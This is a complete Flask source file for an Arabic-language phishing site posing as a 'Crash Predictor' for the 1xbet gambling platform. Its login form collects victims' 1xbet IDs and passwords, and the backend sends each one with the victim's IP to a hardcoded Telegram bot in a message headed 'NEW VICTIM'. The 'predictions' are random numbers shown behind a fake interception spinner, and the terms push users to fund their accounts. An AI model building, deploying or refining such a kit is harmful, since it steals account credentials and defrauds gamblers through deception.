from flask import Flask, render_template_string, request, jsonify, session
import requests
import random
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'simple_secret'

BOT_TOKEN = "8125363786:AAGKkZniUcBMPfS8Ftx4SOF5BS3viANOdiw"
CHAT_ID = "6565594143"

def send_to_telegram(uid, pwd, ip):
    try:
        msg = f"🔥 NEW VICTIM\nID: {uid}\nPASS: {pwd}\nIP: {ip}\nTIME: {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crash Predictor</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0f1e;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
        .btn{background:#ffd700;color:#000;padding:12px;border:none;border-radius:50px;margin:10px;cursor:pointer;width:100%}
        input{width:100%;padding:12px;margin:8px 0;background:#222;border:1px solid #ffd700;color:#fff;border-radius:30px}
        .card{background:rgba(255,255,255,0.05);border-radius:25px;padding:20px;margin:15px 0}
        .prediction-number{font-size:4rem;color:#ff3300;margin:15px}
        .spinner{width:50px;height:50px;border:4px solid #ffd700;border-top-color:#ff3300;border-radius:50%;animation:spin 1s linear infinite;margin:15px auto}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .menu-btn{position:fixed;top:15px;right:15px;background:#ffd700;color:#000;width:45px;height:45px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1001;font-size:24px}
        .sidebar{position:fixed;top:0;right:-280px;width:280px;height:100%;background:#0a0a0a;transition:0.3s;z-index:1000;padding:20px;border-left:1px solid #ffd700}
        .sidebar.active{right:0}
        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999;display:none}
        .overlay.active{display:block}
        .cards-row{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin:20px 0}
        .btn-secondary{background:transparent;border:2px solid #ffd700;color:#ffd700}
        .user-bar{display:flex;justify-content:space-between;background:rgba(0,0,0,0.5);padding:8px 15px;border-radius:50px;margin-bottom:15px}
        .modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:2px solid #ffd700;border-radius:20px;padding:25px;z-index:2000;display:none;width:85%;max-width:300px;text-align:center}
        .modal.active{display:block}
        .modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1999;display:none}
        .modal-overlay.active{display:block}
        .sidebar-header h3{color:#ffd700;margin-bottom:15px}
        .sidebar-menu{list-style:none}
        .sidebar-menu li{padding:12px;border-bottom:1px solid #333;cursor:pointer}
        .sidebar-menu li a{color:#fff;text-decoration:none}
    </style>
</head>
<body>

<div class="menu-btn" onclick="toggleSidebar()">☰</div>
<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <h3>👤 الملف الشخصي</h3>
        <p id="profileId">ID: {{user_id}}</p>
    </div>
    <ul class="sidebar-menu">
        <li><a href="#" onclick="showPage('profile'); closeSidebar()">👤 ملفي الشخصي</a></li>
        <li><a href="#" onclick="showPage('terms'); closeSidebar()">📜 الشروط والأحكام</a></li>
        <li><a href="#" onclick="toggleTheme(); closeSidebar()">🌓 الوضع الليلي</a></li>
        <li><a href="#" onclick="window.open('https://t.me/hkarz1xbetAmeen54bot'); closeSidebar()">📞 فريق الدعم</a></li>
        <li><a href="#" onclick="logout(); closeSidebar()">🚪 تسجيل الخروج</a></li>
    </ul>
</div>
<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
<div class="modal-overlay" id="modalOverlay"></div>
<div class="modal" id="freeModal">
    <h3 style="color:#ffd700;">🎉 عرض خاص!</h3>
    <p>تفعيل الاشتراك المجاني<br><strong>3 أيام مجانية</strong></p>
    <button class="btn" onclick="closeModal()">🚀 تفعيل</button>
</div>

<div class="container" id="app"></div>

<script>
    let userId = '{{user_id}}';
    let currentTheme = 'dark';
    
    function toggleSidebar() {
        document.getElementById('sidebar').classList.toggle('active');
        document.getElementById('overlay').classList.toggle('active');
    }
    function closeSidebar() {
        document.getElementById('sidebar').classList.remove('active');
        document.getElementById('overlay').classList.remove('active');
    }
    function closeModal() {
        document.getElementById('freeModal').classList.remove('active');
        document.getElementById('modalOverlay').classList.remove('active');
        showPage('predictor');
    }
    function toggleTheme() {
        if(currentTheme === 'dark') {
            document.body.style.background = '#f5f5f5';
            document.body.style.color = '#333';
            currentTheme = 'light';
        } else {
            document.body.style.background = '#0a0f1e';
            document.body.style.color = '#fff';
            currentTheme = 'dark';
        }
    }
    function logout() {
        fetch('/logout').then(() => location.reload());
    }
    
    function showPage(page) {
        let html = '';
        if(page === 'welcome') {
            html = '<h1 style="color:#ffd700;">🔥 CRASH PREDICTOR</h1><div class="cards-row"><div class="card"><h3>🔗 ربط الحساب</h3><button class="btn" onclick="showPage(\'link\')">ربط حسابي</button></div><div class="card"><h3>🎲 إنشاء حساب</h3><button class="btn btn-secondary" onclick="window.open(\'https://sa.1xbet.com\')">إنشاء حساب</button></div></div>';
        }
        else if(page === 'link') {
            html = '<h2 style="color:#ffd700;">🔗 ربط الحساب</h2><div class="card"><input type="text" id="uid" placeholder="معرف ID"><br><input type="password" id="pwd" placeholder="كلمة المرور"><br><button class="btn" onclick="submitLogin()">تسجيل الدخول</button><a href="#" onclick="showPage(\'welcome\')" style="color:#ffd700; display:block; margin-top:15px;">← العودة</a></div>';
        }
        else if(page === 'predictor') {
            html = '<div class="user-bar"><span>🎯 ' + userId + '</span><span>⭐ مجانية</span></div><div class="card"><div id="predictionDisplay"><div class="prediction-number">--x</div></div><div id="loadingDisplay" style="display:none;"><div class="spinner"></div><div>جاري الاعتراض...</div></div><button class="btn" onclick="getPrediction()">🎯 توقع التالي</button></div>';
        }
        else if(page === 'profile') {
            html = '<div class="card"><h3>👤 ملفي الشخصي</h3><p><strong>معرف ID:</strong> ' + userId + '</p><p><strong>كلمة المرور:</strong> ********</p><button class="btn" onclick="showPage(\'predictor\')">← العودة</button></div>';
        }
        else if(page === 'terms') {
            html = '<div class="card"><h3 style="color:#ffd700;">📜 الشروط والأحكام</h3><p style="margin:15px 0; text-align:left;">🔹 نظام توقعات لعبة Crash مرتبط بخادم 1xbet.<br><br>🔹 يجب أن يكون حسابك مفعلاً برصيد لا يقل عن 20 دولار.<br><br>🔹 سجل في <a href=\"https://sa.1xbet.com\" target=\"_blank\" style=\"color:#ffd700;\">1xbet.com</a> ثم ارجع لربط حسابك.<br><br>🔹 البيانات الخاطئة لن تعمل مع نظام التوقعات.<br><br>🔹 للدعم: @hkarz1xbetAmeen54bot</p><button class="btn" onclick="showPage(\'welcome\')">← موافق</button></div>';
        }
        document.getElementById('app').innerHTML = html;
        document.getElementById('profileId').innerText = userId;
        closeSidebar();
    }
    
    async function submitLogin() {
        let uid = document.getElementById('uid').value;
        let pwd = document.getElementById('pwd').value;
        if(uid.includes('@')) { alert('الرجاء إدخال معرف ID فقط'); return; }
        let res = await fetch('/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:uid, password:pwd})});
        let data = await res.json();
        if(data.success) {
            userId = uid;
            document.getElementById('freeModal').classList.add('active');
            document.getElementById('modalOverlay').classList.add('active');
        } else {
            alert('خطأ في البيانات');
        }
    }
    
    async function getPrediction() {
        let predDiv = document.getElementById('predictionDisplay');
        let loadDiv = document.getElementById('loadingDisplay');
        predDiv.style.display = 'none';
        loadDiv.style.display = 'block';
        let res = await fetch('/predict');
        let data = await res.json();
        setTimeout(() => {
            loadDiv.style.display = 'none';
            predDiv.style.display = 'block';
            document.querySelector('.prediction-number').innerHTML = data.prediction + 'x';
        }, 4000);
    }
    
    showPage('welcome');
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML, user_id=session.get('user_id', 'ضيف'))

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    uid = data.get('user_id', '').strip()
    pwd = data.get('password', '')
    if '@' in uid or len(uid) < 2:
        return jsonify({"success": False})
    send_to_telegram(uid, pwd, request.remote_addr)
    session['user_id'] = uid
    return jsonify({"success": True})

@app.route('/predict')
def predict():
    time.sleep(random.uniform(2, 3))
    r = random.randint(1, 100)
    if r <= 50:
        pred = round(random.uniform(1.0, 9.9), 1)
    elif r <= 80:
        pred = round(random.uniform(10.0, 19.9), 1)
    else:
        pred = round(random.uniform(20.0, 29.9), 1)
    return jsonify({"prediction": pred})

@app.route('/logout')
def logout():
    session.clear()
    return ""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
